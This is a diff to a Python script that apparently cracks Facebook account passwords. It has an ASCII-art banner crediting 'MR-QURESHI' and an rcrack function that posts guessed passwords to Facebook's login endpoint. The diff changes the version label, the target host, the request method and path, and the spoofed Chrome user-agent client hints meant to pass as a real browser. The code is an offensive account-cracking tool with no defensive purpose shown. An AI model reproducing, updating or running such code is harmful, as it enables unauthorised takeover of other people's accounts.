@@ -113,10 +113,10 @@ logo ="""
 \t\x1b[1;97mdP    Yb 88  Yb     88    dP 
 \033[1;97m [•]================================================
 \033[1;37m [-] TOOLS     :\033[1;32m Random
-\033[1;37m [-] VERSION   :\033[1;32m Personal
+\033[1;37m [-] VERSION   :\033[1;32m 0.1
 \033[1;37m [-] AUTHOR    :\033[1;32m MR-QURESHI
 \033[1;37m [-] GITHUB    :\033[1;32m Mr-Qureshi-xd
-\033[1;37m [-] STATUS      :\033[1;32m PREMUIM
+\033[1;37m [-] STATUS    :\033[1;32m PREMUIM
 \033[1;97m [•]================================================
 \33[1;97m [\33[1;97m×\33[1;97m] \33[1;97mUsed Airplane Mood When Crack Start   
 \033[1;97m [•]================================================"""
@@ -285,14 +285,15 @@ def rcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {
-			'authority': 'x.facebook.com',
-			'method': 'POST',
+			'authority': 'www.facebook.com',
+			'method': 'GET',
+			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 			'accept-encoding': 'gzip, deflate, br',
 			'accept-language': 'en-US,en;q=0.9',
-			'referer': 'https://x.facebook.com/',
-			'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+			'referer': 'https://www.facebook.com/',
+			'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
 			'sec-ch-ua-mobile': '?0',
 			'sec-ch-ua-platform': '"Windows"',
 			'sec-fetch-dest': 'document',
